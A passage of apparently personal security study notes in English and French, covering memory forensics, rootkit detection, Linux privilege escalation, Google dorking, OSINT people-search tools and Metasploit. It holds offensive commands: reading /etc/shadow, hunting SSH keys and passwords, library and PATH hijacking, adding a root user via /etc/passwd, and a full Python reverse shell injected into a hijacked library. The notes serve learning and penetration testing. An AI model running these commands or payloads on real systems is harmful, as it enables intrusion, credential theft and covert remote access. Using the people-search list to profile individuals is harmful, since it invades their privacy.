   <td><strong>This command recovers data from users' clipboards ( presse-papier ).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>windows</strong>
   </td>
   <td><strong>This command enumerates all windows (visible or not) in all desktops of the system</strong>
   </td>
  </tr>
  <tr>
   <td><strong>iehistory</strong>
   </td>
   <td><strong>show internet history</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>When you are suggested profiles ( by imageinfo plugins ), how to choose the correct one ? One of the technique is to compare the value of the service pack field like the image below : </strong>
</li>
</ul>
<p>

<img src="images/image322.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Difference in name profiles :</strong>
</li>
</ul>
<p>

<img src="images/image323.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>	the number of after the “_” is the version of the operating system ( version</strong>
</p>
<p>
<strong>with different changes in memory structure ).</strong>
</p>
<p>
<strong>	</strong>
</p>
<ul>

<li><strong>It’s different when you work on a Virtual machine file and normal operating system file.</strong>
</li>
</ul>
<p>

<img src="images/image324.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>You have to choose the right tool ( to make live captures ) depending on what devices you are focusing on ( SSD, Disk, RAM, VM, …)</strong>
</p>
<p>

<img src="images/image325.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image326.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>You can use these files in Volatility</strong>
</p>
<p>

<img src="images/image327.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Some of Windows Core processes :</strong>
</p>
<p>

<img src="images/image328.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>An other core process :</strong>
</p>
<p>

<img src="images/image329.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Work in conjunction with lsass.exe.</strong>
</li>
</ul>
<p>
<strong>By looking for any deviations ( of each characteristic ) from known normal of these processes, sometimes you are able to easily find evidence of attacker activity malware and so on.</strong>
</p>
<p>

<img src="images/image330.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>A hive in the Windows Registry is the name given to a major section of the registry that contains registry keys, registry subkeys, and registry values. </strong>
</li>
</ul>
<ul>

<li>Les Rootkit :
</li>
</ul>
<p>
<strong>Un rootkit est un programme qui maintient un accès frauduleux à un système informatique et cela le plus discrètement possible, leur détection est difficile, parfois même impossible tant que le système d'exploitation fonctionne.</strong>
</p>
<p>
<strong>Outils :</strong>
</p>

<table>
  <tr>
   <td><strong>rkhunter</strong>
   </td>
   <td><strong>détection de rootkit</strong>
   </td>
  </tr>
  <tr>
   <td><strong>chkrootkit</strong>
   </td>
   <td><strong>détection de rootkit</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Lynis</strong>
   </td>
   <td><strong>détection de malware sur Linux</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>MISC
<ul>

<li><strong>A Loopback Device ( /dev/loop ) is a mechanism used to interpret files as real devices ( like harddisk ). The main advantage of this method is that all tools used on real disks can be used with a loopback device.</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>When you see a malicious processus, it’s necessary to know and find what is its parent process ( in tracking back processus ) to know what happened in the past.</strong>
</li>
</ul>
<ul>

<li><strong>If you find a process with the same name of another common process of the operating system , it’s necessary to check the file path and the parent process to evaluate if it corresponds to the real process and not </strong>
<p>

    <strong>a suspicious process with the same name.</strong>
</p>
<ul>

<li><strong>It’s also good to check when a suspicious process has started ( the date ).</strong>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Dans le monde de l’informatique légale (computer forensics), les données existent notamment sous trois états : </strong> 
<ul>
 
<li><strong>En transit (data in transit) qui décrivent des données qui sont en mouvement à travers un réseau ou entre deux espaces de stockage.</strong>
 
<li><strong>Au repos (data at rest). Dans cet état, les données résident sur des médias non-volatiles (disques durs, cartes mémoires, clés USB, etc.) et ne sont ni lues ni traitées.</strong>
 
<li><strong>En utilisation (data in use) où les données sont utilisées sur le moment par l’utilisateur ou par le CPU.</strong>
<p>

        <strong>Lorsque les données sont utilisées, elles sont retirées du disque dur et stockées temporairement dans la mémoire RAM, car bien plus rapide que le disque dur. </strong>
</p>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>In Unix-like operating systems, a loop device ( /dev/loop0 for example ) is a pseudo-device that makes a file accessible as a block device.” In short, a loop device allows us to present the image file ( file.img for example ) to the operating system as if it were an actual “disk”.</strong>
</li>
</ul>
<ol>

<li>Linux Privilege Escalation
</li>
</ol>
<p>
<strong><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#tools</a></strong>
</p>
<h3>   System enumeration command :</h3>



<table>
  <tr>
   <td><strong>uname -a  </strong>
<p>
<strong>cat /proc/version </strong>
<p>
<strong>cat /etc/issue</strong>
   </td>
   <td><strong>Display information about the kernel ( processor, version , distribution … )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hostname [OPTIONS]</strong>
   </td>
   <td><strong>The <em>hostname</em> <a href="http://www.linfo.org/command.html">command</a> is used to show or set a computer's <em><a href="http://www.linfo.org/host_name.html">host name</a></em> and <em><a href="http://www.linfo.org/domain_name.html">domain name</a></em>.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>lscpu</strong>
   </td>
   <td><strong>Display information about the architecture, the CPU, . . .</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ps aux</strong>
<p>
<strong>ps -edf</strong>
   </td>
   <td><strong>Display what services are running</strong>
   </td>
  </tr>
  <tr>
   <td><strong>whoami</strong>
   </td>
   <td><strong>Display your own hostname</strong>
   </td>
  </tr>
  <tr>
   <td><strong>id</strong>
   </td>
   <td><strong>Display some information about the current user</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sudo -l</strong>
   </td>
   <td><strong>Display what command you can run at sudo what you can manipulate as sudo</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cat /etc/passwd</strong>
<p>
<strong>cat /etc/shadow</strong>
<p>
<strong>cat /etc/group</strong>
   </td>
   <td><strong>Display informations about all users and groups</strong>
   </td>
  </tr>
  <tr>
   <td><strong>history</strong>
   </td>
   <td><strong>Display the history about the commands executed</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ifconfig</strong>
<p>
<strong>ip a</strong>
<p>
<strong>ip route</strong>
   </td>
   <td><strong>Print out common informations about networking</strong>
   </td>
  </tr>
  <tr>
   <td><strong>arp -a</strong>
<p>
<strong>ip neigh</strong>
   </td>
   <td><strong>Print out the ARP table</strong>
   </td>
  </tr>
  <tr>
   <td><strong>netstat ano</strong>
   </td>
   <td><strong>Print out what ports are opened, state of socket, connections . . .</strong>
   </td>
  </tr>
  <tr>
   <td><strong>grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2> /dev/null</strong>
   </td>
   <td><strong>This long command is going to look for the word “PASSWORD=” in files and print it out in red color.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>locate password | more</strong>
   </td>
   <td><strong>Display files that contain “password” in their names.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find / -name authorized_key 2> /dev/null</strong>
<p>
<strong>find / -name id_rsa 2> /dev/null</strong>
   </td>
   <td><strong>Looking for some useful informations about SSH (keys, …) that you can access to.</strong>
<p>
<strong>id_rsa is a common name for ssh private key.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</strong>
<p>
<strong>wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py</strong>
   </td>
   <td><strong>Looking for files that are SUID enabled.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>getcap -r / 2>/dev/null</strong>
   </td>
   <td><strong>Looking for capabilities of binaries .</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Tcpdump -D</strong>
   </td>
   <td><strong>list all interfaces</strong>
   </td>
  </tr>
  <tr>
   <td><strong>timeout 150 tcpdump -w cap.pcap -i veth1665bcd</strong>
   </td>
   <td><strong>inspect “veth1665bcd” traffic if possible, and save the output in a pcap file “cap.pcap”.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ss -tnl</strong>
   </td>
   <td><strong>ss command is a tool that is used for displaying network socket related information on a Linux system. ( to see active socket )</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Pensez à regarder les fichiers liés aux exécutions journalières ( cron, …)</strong>
<ul>

<li><strong>Some Linux Privilege Escalation tool for enumeration : </strong> 
<ul>
 
<li><strong>LinPEAS</strong>
 
<li><strong>LinEnum</strong>
 
<li><strong>LES</strong>
 
<li><strong>Linuxprivchecker : looking for potential CVE that can be performed.</strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

            <strong>It’s important to run different tools ( not only one ) to not miss something important.</strong>
</p>
<ul>

<li>Kernel exploitation : 
<ul>
 
<li><strong>Find the version of the kernel and then search for some known exploit that gives you privileges and run it.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Passwords & File Permissions exploitation : 
<ul>
 
<li><strong>You can type the command history or cat .bash_history  and check if there are some passwords written here.</strong>
</li> 
</ul>
</li> 
</ul> 
<ul>
 
<li><strong>You can search some special words in all the files that can lead you to find a real password.</strong>
</li> 
</ul>
<ul>

<li><strong>Look if you have reading permission to /etc/shadow. If you have this permission, you can take the content of /etc/shadow and /etc/passwd and run some script ( Like unshadow already installed in Kali) that will give you an output that you are going to use to bruteforce the hashes with Hashcat. </strong>
</li>
</ul>
<ul>

<li><strong>If you find some private key ( id_rsa ), you can use it to connect on the machine via ssh as the owner that has that private key using it instead of login / password. </strong>
<p>

                <strong>for each known and authorized public key, you can connect to the machine via the private key.</strong>
</p>
<p>

                <strong>example : </strong>
</p>
<p>

                <strong>chmod 600 root_private_key ( On doit rendre la clef inaccessible au autre )</strong>
</p>
<p>

                <strong>ssh -i root_private_key root@192.168.4.67</strong>
</p>
</li>
</ul>
<ul>

<li>Sudo exploitation :
<ul>

<li>LD_PRELOAD : 
<ul>
 
<li><strong>If you have this variable running as root, you can run your own code ( and so invoke a shell ): </strong>
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<p>

<img src="images/image331.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image332.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>Here , the command find has to be running as sudo permission.</strong>
</p>
<ul>

<li>SUID Exploitation 
<ul>
 
<li><strong>Search in <a href="https://gtfobins.github.io">https://gtfobins.github.io</a> and google to know if you can exploit what you have find as SUID file, binaries.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Shared Object Injection : 
<ul>
 
<li><strong>1) Search for some executable with SUID enabled</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>2) Run it with Strace.</strong>
</li>
</ul>
<ul>

<li><strong>3) Looking for some Shared library that the program try to open or access :</strong>
</li>
</ul>
<p>

<img src="images/image333.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>4) Write your fake library like this :</strong>
</li>
</ul>
<p>

<img src="images/image334.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>5) Then compile this fake library and execute the SUID program (en écrasant la librairie de base si possible ).</strong>
</li>
</ul>
<p>
<strong>					gcc -shared -fPIC -o [ABSOLUTE_PATH.so] </strong>
</p>
<p>

                <strong>[ABSOLUTE_PATH.sc] </strong>
</p>
<ul>

<li>VIA Environment Variables : 
<ul>
 
<li><strong>1) Search for some executable with SUID</strong>
<p>

                <strong>   enabled</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>2) Run the command strings on that executable to see if there is something executed that uses Environment Variables “shortcut” ( $PATH ).</strong>
<p>

                    <strong>Example : “service apache2 start “.The program service is using the environment variable $PATH to be found without absolute path.</strong>
</p>
</li>
</ul>
<ul>

<li><strong>4) Write your own payloads ( In this example, this is a fake “service” program ) that will be executed instead of the real service program.</strong>
</li>
</ul>
<p>

<img src="images/image335.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image336.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>5) Put your payload directory at the first position in PATH environment variable :</strong>
</li>
</ul>
<p>

<img src="images/image337.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>6) Run the SUID program.</strong>
</li>
</ul>
<p>
<strong>				Another way to perform this : </strong>
</p>
<p>
<strong>﻿</strong>
<img src="images/image338.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Vérifier si des fichiers exécutés de façon récurrente ( avec CRON ) sont disponible et modifiable. On pourrait les remplacer par un autre fichier ( ayant le même nom ) pour invoquer un shell ou autre …</strong>
</li>
</ul>
<ul>

<li><strong>Si les commandes nano,cp .. ( commande d'écriture ) sont utilisables en mode SUID-bit, on peut l’utiliser pour créer un nouveau user dans le fichier /etc/passwd avec les droits root et se connecter dessus :</strong>
</li>
</ul>
<p>

<img src="images/image339.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image340.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image341.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li>Exploiting SUID permission in cpulimit command :
<p>

    
<img src="images/image342.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
<p>
<strong>		entre temps : cd /ignite/</strong>
</p>
<ul>

<li>RCE through mysql command on a writeable directory :
</li>
</ul>
<p>

<img src="images/image343.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>URL ( in the context of the screenshot ) : 	<a href="http://192.168.1.167:8080/raj.php?cmd=id">http://192.168.1.167:8080/raj.php?cmd=id</a></strong>
</p>
<ul>

<li>Lxd Privilege Escalation
</li>
</ul>
<p>
<strong>	LXD est un logiciel libre développé par Canonical pour simplifier la</strong>
</p>
<p>

    <strong>manipulation de conteneurs de logiciels ( comme Docker ) à la manière  d'un hyperviseur de VM.</strong>
</p>
<p>

    <strong>Il a l'avantage d'être beaucoup plus léger qu'une machine virtuelle classique, car il ne virtualise pas un OS complet mais partage de nombreuses ressources avec l'OS hôte. On parle d'environnements virtuels</strong>
</p>
<p>
<strong>LXD has a root process that carries out actions for anyone with write</strong>
</p>
<p>
<strong>access to the LXD UNIX socket.</strong>
</p>
<p>

    <strong>A member of the local “lxd” group can sometimes instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password.</strong>
</p>
<p>
<strong>For more detail:</strong>
</p>
<p>
<strong><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></strong>
</p>
<ul>

<li>Python Library Hijacking
</li>
</ul>
<h4>Method 1 : From Bad Write Permission</h4>


<ul>

<li>Prérequis : 
<ul>
 
<li>SUDO ou SUID sur un fichier python à exécuter. 
 
<li>Une lib est importé dans ce fichier
 
<li>Accès en écriture sur cette lib.
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Exploitation : 
<ul>
 
<li>Modifier la lib et injecter un Reverse shell en python dans le code :
</li> 
</ul>
</li> 
</ul>



<pre class="prettyprint">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
</pre>


<h4>Method 2 : Priority Order</h4>


<ul>

<li>Prérequis : 
<ul>
 
<li>SUDO ou SUID sur un fichier python à exécuter. 
 
<li>Une lib est importée dans ce fichier.
 
<li>Accès en écriture sur le dossier ou se trouve ce fichier.
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Exploitation : 
<ul>
 
<li>Créer un fichier python avec le même nom que la lib importée dans le même dossier sur le fichier python vulnérable ( il va être pris en compte en priorité dans l’importation des lib ). 
<ul>
 
<li>Écrire un Revers shell en python dans ce nouveau fichier.
</li> 
</ul>
</li> 
</ul>
</li> 
</ul>
<h4>Method 3 : PYTHONPATH Environment Variable</h4>


<p>
Théorie : This vulnerability is based on the Python Library that is searching through the Python PATH Environment Variable. This variable holds a list of directories where the python searches for the different directories for the imported modules. If an attacker can change or modify that variable then they can use it to elevate privileges on the target machine.
</p>
<ul>

<li>Prérequis : 
<ul>
 
<li>SUDO ou SUID sur un fichier python à exécuter. 
 
<li>Une lib est importée dans ce fichier.
 
<li>Pouvoir faire des changements dans la variable d’env PYTHONPATH.
</li> 
</ul>
</li> 
</ul>
<ul>

<li>Exploitation :
</li>
</ul>
<p>

<img src="images/image344.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image345.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image346.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li><strong>Gathering information</strong>

<li><strong>With Search Engines to gather information, you can find about the target:</strong> 
<ul>
 
<li><strong>Sensitive files and folders</strong>
 
<li><strong>Username, password, email,..</strong>
 
<li><strong>Server or system vulnerabilities</strong>
 
<li><strong>Login pages</strong>
</li> 
</ul>
</li> 
</ol>
<ul>

<li><strong>Google Dorking ( or hacking ) : Computer hacking technique that uses Google innate abilities to find security holes in the configuration and computer code that websites use. </strong>
</li>
</ul>
<ul>

<li><strong>queries database : <em><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></em></strong>
</li>
</ul>
<ul>

<li><strong>Example Google Dork instruction :</strong>

<table>
  <tr>
   <td>
<strong>filetype:pdf anonymat</strong>
</li>
</ul>
   </td>
   <td><strong>Retournera les documents PDF</strong>
<p>
<strong>contenant le mot anonymat.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>site:funinformatique.com VPN</strong>
   </td>
   <td><strong>Trouvera toutes les pages contenant</strong>
<p>
<strong>le mot <a href="https://www.funinformatique.com/cest-quoi-vpn-bien-lutiliser/">VPN</a> dans leur texte et se trouvant dans le</strong>
<p>
<strong>domaine funinformatique.com</strong>
   </td>
  </tr>
  <tr>
   <td><strong>inurl:VPN</strong>
   </td>
   <td><strong>Trouvera les pages contenant le mot VPN dans l’adresse URL</strong>
   </td>
  </tr>
  <tr>
   <td><strong>intitle:VPN</strong>
   </td>
   <td><strong>Specifying intitle, will tell google to show only those pages that have the term in their html title</strong>
   </td>
  </tr>
  <tr>
   <td><strong>filetype</strong>
   </td>
   <td><strong>Searches for specific file types. filetype:pdf will looks for pdf files in websites. Similarly filetype:txt looks for files with extension .txt</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ext</strong>
   </td>
   <td><strong>Similar to filetype.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>intext</strong>
   </td>
   <td><strong>Searches the content of the page. Somewhat like a plain google search.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>allintext:username filetype:log</strong>
   </td>
   <td><strong>Search file with log extension that contains “username”(on the body page).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>“search term”</strong>
   </td>
   <td><strong>Force an exact-match search ( accolade )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>jobs OR gates OU</strong>
<p>
<strong>jobs | gates</strong>
   </td>
   <td><strong>The pipe (|) operator can also be used in place of “OR.”</strong>
   </td>
  </tr>
  <tr>
   <td><strong>jobs AND gates</strong>
   </td>
   <td><strong>Search for X and Y.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>jobs ‑apple</strong>
   </td>
   <td><strong>The character “-” Exclude a term or phrase. In our example, any pages returned will be related to jobs but not Apple (the company).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>steve * apple </strong>
   </td>
   <td><strong>“ * ” : Acts as a wildcard and will match any word or phrase.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>(ipad OR iphone) apple</strong>
   </td>
   <td><strong>“( )” : Group multiple terms or search operators to control how the search is executed.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>define:entrepreneur</strong>
   </td>
   <td><strong>This will display the meaning of a word</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cache:apple.com</strong>
   </td>
   <td><strong>Returns the most recent cached version of a web page</strong>
   </td>
  </tr>
  <tr>
   <td><strong>apple AROUND(4) iphone</strong>
   </td>
   <td><strong> For this example, the words “apple” and “iphone” must be present in the content and no further than four words apart.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>map:silicon valley</strong>
   </td>
   <td><strong>Force Google to show map results for a locational search.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>$329 in GBP</strong>
   </td>
   <td><strong>Convert one unit to another. Works with currencies, weights, temperatures, etc.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wwdc video 2010..2014</strong>
   </td>
   <td><strong>Search for a range of numbers. </strong>
<p>
<strong>In the example below, searches related to “WWDC videos” are returned for the years 2010–2014, but not for 2015 and beyond.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>steve jobs daterange:11278-13278</strong>
   </td>
   <td><strong>Find results from a certain date range. Uses the <em>Julian date</em> format, for some reason</strong>
   </td>
  </tr>
  <tr>
   <td><strong>site:*.*.microsoft.com ext:php</strong>
   </td>
   <td><strong>find subdomains on microsoft</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>Shodan almost do the same but in more high range: Shodan search on “internet” et Google dorking search on” World Wide Web”. You can filter your research by country , port, Os system,...</strong>
</li>
</ul>
<ul>

<li><strong>people's search engine : </strong> 
<ul>
 
<li><strong>checkusernames.com (pseudo research in S.network).</strong>
 
<li><strong><a href="https://webmii.com">https://webmii.com</a> ( by first and last name )</strong>
 
<li><strong>….</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>WayBackMachine : To find Web Archives.</strong>
</li>
</ul>
<ul>

<li><strong>FOCA ( On Windows ): Fingerprinting Organisations which Collected Metadata Archives ( of a website).</strong>
</li>
</ul>
<ul>

<li><strong>Google Alert :</strong>
</li>
</ul>
<p>
<strong>			Alert a person when a new content about a “string </strong>
</p>
<p>

        <strong>character” is pop on the web.</strong>
</p>
<ol>

<li>Format ELF
</li>
</ol>
<h3>
                       Section in ELF</h3>



<table>
  <tr>
   <td><strong>.data</strong>
   </td>
   <td><strong>Données initialisées déclarées</strong>
   </td>
  </tr>
  <tr>
   <td><strong>.rodata</strong>
   </td>
   <td><strong>Données initialisées déclarées en lecture seule</strong>
   </td>
  </tr>
  <tr>
   <td><strong>.bss</strong>
   </td>
   <td><strong>Données non initialisées déclarées</strong>
   </td>
  </tr>
  <tr>
   <td><strong>.plt</strong>
   </td>
   <td><strong>Procedure Linkage Table. Cette section regroupe l’ensemble des fonctions que nous voulons "importer" de bibliothèques partagées. </strong>
<p>
<strong>Par exemple, un programme compilé avec les options par défaut sous gcc et utilisant l’appel printf va stocker dans la section .plt l’adresse de la fonction printf, elle-même véritablement localisée dans la bibliothèque partagée libc.so.6.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<h3>Environnement d'exécution :</h3>


<p>

<img src="images/image347.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong><em>Il se peut que les sections n'aient pas les mêmes adresses (mesure de sécurité).</em></strong>
</li>
</ul>
<p>

                <strong>Plus de précision :</strong>
</p>
<p>

<img src="images/image348.png" width="" alt="alt_text" title="image_tooltip">

<img src="images/image349.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image350.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>The Program Headers (among other functions) are more often for telling the memory loader where to put stuff.</strong>
<ol>

<li>Python

<li>MISC
</li>
</ol>
</li>
</ul>
<ul>

<li><strong>Python3 makes the distinction between bytes and str, when converting a printable string to bytes, the method .encode() is used. But this method crashes when trying to convert non-printable characters like \xFF.</strong>
</li>
</ul>
<ol>

<li>OSINT
</li>
</ol>
<h3>          Useful tools</h3>



<table>
  <tr>
   <td><strong>20minutemail</strong>
   </td>
   <td><strong>Create temporary email</strong>
   </td>
  </tr>
  <tr>
   <td><strong>KeePass</strong>
   </td>
   <td><strong>Generator and keeper good password</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cryptomator</strong>
   </td>
   <td><strong>Encrypt file</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Onionshare</strong>
   </td>
   <td><strong>Share file over the Tor network ( for being anonymous ) like “Pastebin” for file.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>PIC2Map.com</strong>
   </td>
   <td><strong>Géolocalisation de photo extérieur.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>beenverified.com</strong>
   </td>
   <td><strong>Reverse email search</strong>
   </td>
  </tr>
  <tr>
   <td><strong><a href="https://www.spydialer.com/">https://www.spydialer.com/</a></strong>
<p>
<strong>411.com</strong>
   </td>
   <td><strong>reverse phone number</strong>
   </td>
  </tr>
  <tr>
   <td rowspan="2" ><strong>Bing browser</strong>
<p>
<strong>Yandex browser</strong>
   </td>
   <td rowspan="2" ><strong>There is also reverse image tool in bing</strong>
<p>
<strong>Yandex is Better than google to search about persons</strong>
   </td>
  </tr>
  <tr>
  </tr>
  <tr>
   <td><strong>Tineye.com</strong>
   </td>
   <td><strong>reverse image search</strong>
   </td>
  </tr>
  <tr>
   <td><strong>searchyellowdirectory.com</strong>
<p>
<strong>comfi.com/abook/reverse</strong>
   </td>
   <td><strong>Reverse phone lookup in all over the world</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Blackbookonline.com</strong>
   </td>
   <td><strong>US Public record online ( plenty type of information about a person)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>xlek.com</strong>
   </td>
   <td><strong>free public data search ( US tool )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dehashed.com</strong>
<p>
<strong>haveibeenpwned.com</strong>
   </td>
   <td><strong>Data breaches reporting ( password leaked, email leaked, …)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>webmii</strong>
   </td>
   <td><strong>Search on people in particular</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Spiderfoot</strong>
   </td>
   <td><strong>Web site scanner</strong>
   </td>
  </tr>
  <tr>
   <td><strong>HTTrack</strong>
   </td>
   <td><strong>Website copier ( and then expose the copie on port 8080 )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>metagoofil</strong>
   </td>
   <td><strong>Download all document from a URL</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wayback.archive.org</strong>
<p>
<strong>Resurrect pages ( plugin on firefox )</strong>
   </td>
   <td><strong>Très bon outils pour retrouver des informations supprimé all over the internet ( social media, …)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>datafakegenerator.com</strong>
   </td>
   <td><strong>Nom très explicite</strong>
   </td>
  </tr>
  <tr>
   <td><strong>tinfoleak</strong>
   </td>
   <td><strong> get detailed info about a Twitter user.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>intelTechniques</strong>
   </td>
   <td><strong>Provide huge amount of information from a Facebook ID</strong>
   </td>
  </tr>
  <tr>
   <td><strong>https://osintframework.com</strong>
   </td>
   <td><strong>provide plenty of source and framework about Osint</strong>
   </td>
  </tr>
  <tr>
   <td><strong>https://intelx.io/signup</strong>
   </td>
   <td><strong>Effectue plusieurs actions par rapport à l’OSint.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ol>

<li>Metasploit
<ul>

<li>Autoroute exploit :
<p>

    <strong>Metasploit has an autoroute exploit that can route the network in such a way that internal IP is accessible from outside by adding a route to an internal network. </strong>
</p>
<p>

    <strong>Autoroute will create a new host to connect with whose traffic will be redirected to the internal service. </strong>
</p>
<p>

    <strong>But, Autoroute doesn’t tell us the IP Address of the new host.</strong>
</p>
<p>

    <strong>Example :</strong>
</p>
<p>


<img src="images/image351.png" width="" alt="alt_text" title="image_tooltip">

<img src="images/image352.png" width="" alt="alt_text" title="image_tooltip">

</p>
